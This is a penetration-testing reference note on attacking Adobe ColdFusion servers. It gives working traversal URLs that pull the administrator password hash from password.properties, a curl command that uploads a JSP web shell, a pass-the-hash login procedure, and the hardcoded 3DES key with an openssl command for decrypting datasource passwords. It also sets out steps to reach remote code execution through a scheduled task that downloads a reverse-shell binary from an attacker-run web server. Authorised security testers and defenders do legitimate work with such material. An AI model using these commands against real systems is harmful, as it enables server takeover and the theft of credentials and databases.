# Web applications - Software ColdFusion

### Overview

Adobe ColdFusion is a commercial web application development platform created
in 1995 which uses the programming language ColdFusion Markup Language (CFML).
Indeed, Adobe ColdFusion implements an engine which process the CFML files
(.cfm, .cfc).

Adobe ColdFusion can be run on Windows, Linux, Solaris, etc. and IIS, Apache,
etc. ColdFusion runs be default as `NT AUTHORITY\ SYSTEM` on Windows and
`nobody` on Linux.

While Adobe ColdFusion used to have a wider adoption, ColdFusion is used, as of
2019, by approximately 0.5% of all the public websites. Its main use cases
remains for intranets and niche web applications development. In 2012 the
`Google` search query `inurl:index.cfm` returned more than 750 millions results,
corresponding to approximately the same number of ColdFusion websites, while in
2019 it only returns around 30 millions results.

As of January 2019, the last Adobe ColdFusion version is `ColdFusion 2018`.

### Network scan and basic recon

###### Network scan

###### Version disclosure

The `adminapi` may be accessible and used to disclose the precise version being
used:

```
<http | https>://<HOSTNAME>:<PORT>/CFIDE/adminapi/base.cfc?wsdl

# <!--WSDL created by ColdFusion version X,X,X,X-->
```

The `Metasploit` module `auxiliary/scanner/http/coldfusion_version` can be used
to retrieve to the ColdFusion version in use:

The module relies on versions, author or copyright information that could be
disclosed in a Adobe ColdFusion core page body
(`/CFIDE/administrator/index.cfm`).

```
msf> use auxiliary/scanner/http/coldfusion_version
```

The `clusterd` tool can be used to fingerprint the version as well:

```
python clusterd.py -a coldfusion -i <IP>
```

###### Standard vs Enterprise editions

The standard Adobe ColdFusion edition does not support `Javascript`.

Requesting a non-existing `jsp` file (such as /non-existing-randomnumber.jsp)
will thus give two different error messages depending on the edition used:

  - *Error HTTP 500 Internal server error* will be returned for a standard
    edition
  - *Error HTTP 404 Not Found* will be returned for an enterprise edition

### Known vulnerabilities

The `CVE Details` web page can be consulted for an updated list of the known
vulnerabilities discovered on Adobe ColdFusion:

```
https://www.cvedetails.com/product/8739/Adobe-Coldfusion.html
```

The exploitation process can be automated using `clusterd` for the
vulnerabilities:
  - CVE-2009-2265
  - APSB10-18 / CVE-2010-2861
  - CVE-2013-0632
  - Pass-the-Hash administrator authentication for Adobe ColdFusion 7 to 9

The most reliable way for attacking older versions of Adobe ColdFusion is to:
  - extract the administrator password hash using CVE-2010-2861 or CVE-2013-3336
  - authenticate to the web administrator interface directly using the
    retrieved hash (Adobe ColdFusion 7 to 9) or after cracking it offline  
    (Refer to the `[General] Passwords cracking` note for password cracking
    tools and techniques)
  - deploy a `JSP` web / reverse shell using the Task Scheduler functionality.
    For `JSP` web / reverse shells refer to the `[General] Shells` note.

```
# Retrieve the administrator hash
python clusterd.py -a coldfusion --cf-hash -i <IP>

# Deploy a JSP executable through the Task Scheduler functionality
python clusterd.py -a coldfusion --deploy <JSP_FILE_PATH> --deployer schedule_job --usr-auth <HASH> -i <IP>
```

###### CVE-2009-2265 - FCKeditor File Upload and Execute

Multiple directory traversal vulnerabilities in FCKeditor before 2.6.4.1
can be leveraged to create executable files in arbitrary directories on
**Adobe ColdFusion 8.0.1**.

The `Metasploit` module `exploit/windows/http/coldfusion_fckeditor` can be used
to exploit the vulnerability:

```
msf > use exploit/windows/http/coldfusion_fckeditor
```

###### APSB10-18 / CVE-2010-2861 hash extraction through Local File Inclusion

On **Adobe ColdFusion MX6, MX7, 8.0, 8.0.1, 9.0, 9.0.1** with out the APSB10-18
patch, released in August 2010, a local file inclusion vulnerability may be
leveraged to retrieve the administrator password SHA1 hash from the
`password.properties` file.

No patches were released for the Adobe ColdFusion MX6 and MX7 as theses
versions were end of life support at the time of the vulnerability discovery.    

If the local file inclusion could be successfully exploited, the password SHA1
hash will be displayed on the administrative login page. Note that, in some
cases, the hash does not need to be cracked as a Pass-the-Hash authentication
may be possible depending on the ColdFusion version.

```
# <http | https>://<HOSTNAME | IP>:<PORT>/<...>

# ColdFusion 6
/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%en
/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en

# ColdFusion 7
/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%en
/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en

# ColdFusion 8
/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en
/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en

# All versions
/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%en
/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en
```

The `Metasploit` module `auxiliary/scanner/http/coldfusion_locale_traversal` can
be used to automate the process:

```
msf> use auxiliary/scanner/http/coldfusion_locale_traversal
```

###### CVE-2013-0632 - RDS null password

A vulnerability in the RDS component in **Adobe ColdFusion 9.0, 9.0.1, 9.0.2,
and 10** can be leveraged to bypass authentication. Due to default settings or
misconfiguration, its password can be set to an empty value.

The `Metasploit` module `exploit/multi/http/coldfusion_rds` can be used to
deploy a `Metasploit` payload through an RDS session:

```
msf> use exploit/multi/http/coldfusion_rds
```

###### APSB13-13 / CVE-2013-3336 - hash extraction through directory traversal

A directory traversal vulnerability on **Adobe ColdFusion 9 and 10** can be
leveraged to extract information such as password, rdspassword, and
"encrypted" properties.

The `Metasploit` module `auxiliary/gather/coldfusion_pwd_props` can be used to
exploit the vulnerability and deploy a `Metasploit` payload:

```
msf> use auxiliary/gather/coldfusion_pwd_props
```

###### APSB17-14 / CVE-2017-3066 - BlazeDS Java Object Deserialization RCE

A java deserialization bug in the Apache BlazeDS component of **Adobe
ColdFusion 10, 11 and 2016** can lead to remote code execution.

The `ColdFusionPwn` tool (for Adobe ColdFusion 11 and ColdFusion 2016) as well
as the following exploit code can be used to exploit the vulnerability:

```
https://www.exploit-db.com/exploits/43993
```

###### APSB18-33 / CVE-2018-15961 - Unrestricted file upload

An unrestricted file upload flaw affecting **Adobe ColdFusion 11** (Update 14
and earlier), **ColdFusion 2016** (Update 6 and earlier), and **ColdFusion
2018** (July 12 release)** can be leveraged to upload and execute a web shell.

The default configuration restrict the following file formats `cfc`, `exe`,
`php`, `asp`, `cfm` and `cfml`, leaving the possibility of uploading and
executing a `JSP` web shell.

The following `curl` command can be used to upload the `JSP` web / reverse
shell:

```
curl <http | https>://<HOSTNAME | IP>:<PORT>/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm -X POST -F "file=@<LOCAL_FILENAME>" -F "path=path"
```

The shell will be uploaded and accessible at the following URL:

```
http://coldfusion:port/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/<FILENAME>
```

For `jsp` web / reverse shells refer to the `[General] Shells` note.

The `Metasploit` module `exploit/multi/http/coldfusion_ckeditor_file_upload` can
be used to automate the process:

```
msf> use exploit/multi/http/coldfusion_ckeditor_file_upload
```

###### Client-side injection - cross-site scripting (XSS)

Multiples cross-site scripting vulnerabilities have been discovered over the
year on Adobe ColdFusion, for a total number of 31 discoveries as of
January 2019.  

###### Server-side injection - SQL injections (SQLi)

While no publicly known SQL injection are present on the Adobe ColdFusion core,
custom CF pages may be vulnerable to SQL injections.

Refer to the `[WebApps] SQL injections` notes for more information on how to
discover and exploit SQL injections flaws.   

###### Pass-the-Hash administrative interface authentication

On **Adobe ColdFusion MX6 to 9**, the administrator hash can be used to
authenticate to the administrative interface (Pass-the-Hash).

Indeed, the login form realize the following operation, hashing the user
provided clear text password twice:

```
onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));"
```

The following steps can be used to authenticate using the SHA1 administrator
password:

  1. Enter the SHA1 password hash in the password field of the login form
  2. Load the following `JavaScript` code using the developer console of the
  browser, a pop up containing the temporary salted second hash should appear.
  ```
  javascript:alert(hex_hmac_sha1(document.loginform.salt.value, document.loginform.cfadminPassword.value))
  ```
  3. Catch the login request (using a HTTP proxy such as `Burp Suite`) and
  replace the value of the `cfadminPassword` paramter with the salted temporary
  hash
  4. Profit

### Data sources information retrieval

An access to the web administrative interface or the operating system file
system can be leveraged to retrieve the configured data sources
(databases, etc.) information.

For **Adobe ColdFusion MX6 to 9**, the retrieved passwords can be reversed
using the single known hardcoded key.

###### Administrative interface

If databases are configured to interact with the Adobe ColdFusion service, the
databases information and passwords can be retrieved through the administrative
interface in the `Data & Services -> Data Sources` page.

The `HTML` page source code will contain the encrypted password for the data
source reviewed.

###### XML configuration files

For `Adobe ColdFusion MX6 and MX7`, the configured data sources information and
passwords are stored in `neo-query.xml` and for `ColdFusion 8, 9, 10, 2016 and
2018` in `neo-datasource.xml`.

The configuration files will contain all the data sources encrypted password
in `XML` tags such as:

```
<var name='password'><string>Zd4pDTWJTR0ZZARRw8oj7y4B9ttmxgHY3i03R0X1IaM=</string></var>
```

###### Decrypt data sources passwords

On **Adobe ColdFusion MX6 to 9**, the passwords for the data sources are
encrypted with the `3DES` algorithm using the hardcoded key
`0yJ!@1$r8p0L@r1$6yJ!@1rj` and encoded in `base64`.
The passwords can thus be decrypted using `openssl` (provided by Szili Dávid):

```
echo <ENCRYPTED_PASSWORD_IN_BASE64> | openssl des-ede3 -a -d -K 30794A21403124723870304C4072312436794A214031726A; echo
```

Starting with **Adobe ColdFusion 10 and 11**, the key is randomly generated at
runtime, making it impossible to reverse the passwords in `neo-datasource.xml`
with the hardcoded key.

### Administrative interface to RCE

The Adobe ColdFusion administrative interface allows for download and
execution of scripts and binaries through scheduled tasks, effectively
permitting system commands execution.

As specified above `clustered` can be used to automaticly deploy a JSP
executable through the Task Scheduler functionality:

```
python clusterd.py -a coldfusion --deploy <JSP_FILE_PATH> --deployer schedule_job --usr-auth <HASH> -i <IP>
```

To process to manually setup a scheduled task that will execute the specified
binary is as follow:

  1. Create a reverse shell executable  
     (Refer to the `[General] shells` note)

  2.
  a. Launch a webserver exposing the created reverse shell  
     (Refer to the `[General] File transfer` note)  
  b. Setup a listener for the reverse shell connection

  3. Retrieve the system time at

     ```
     <http | https>://<HOSTNAME | IP>/CFIDE/administrator/reports/index.cfm
     ```

  4. Create a scheduled task in and specify the URL

     ```
     Debugging & Logging > Add/Edit Scheduled Task

     # Frequency
     "One-Time at" <SERVER_TIME + 1>
     # URL
     http://<WEBSERVER_IP>:<PORT>/<FILE>
     ```
